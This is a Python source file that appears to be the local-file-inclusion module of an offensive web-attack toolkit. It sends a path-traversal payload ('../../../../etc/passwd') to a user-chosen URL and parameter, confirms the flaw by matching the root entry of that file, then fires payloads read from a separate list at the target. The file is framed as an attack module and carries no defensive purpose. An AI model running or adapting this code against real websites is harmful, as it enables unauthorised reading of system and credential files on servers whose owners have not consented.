# web_apps/file_inclusion.py
import requests

LFI_PAYLOAD_FILE = "web_apps/payloads/lfi_payloads.txt"

def check_lfi_vulnerability(url, param):
    """Check if a web application is vulnerable to Local File Inclusion (LFI)."""
    test_payload = "../../../../etc/passwd"
    response = requests.get(url, params={param: test_payload})

    if "root:x:0:0:" in response.text:
        print(f"[+] The website is vulnerable to LFI! ({url})")
        return True
    else:
        print("[-] No LFI vulnerability detected.")
        return False

def exploit_lfi(url, param):
    """Exploit LFI vulnerability using stored payloads."""
    try:
        with open(LFI_PAYLOAD_FILE, "r") as file:
            payloads = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print("[-] LFI payload file not found!")
        return

    print("\n[+] Available LFI Payloads:")
    for i, payload in enumerate(payloads, start=1):
        print(f"{i}) {payload}")

    choice = input("\nSelect a payload number to use: ")
    try:
        selected_payload = payloads[int(choice) - 1]
        response = requests.get(url, params={param: selected_payload})
        print(f"[+] LFI Payload Sent: {selected_payload}")
    except (IndexError, ValueError):
        print("[-] Invalid choice!")

def lfi_attack():
    """Main function for LFI attack module."""
    url = input("Enter the target URL: ")
    param = input("Enter the parameter to test: ")

    if check_lfi_vulnerability(url, param):
        exploit_lfi(url, param)
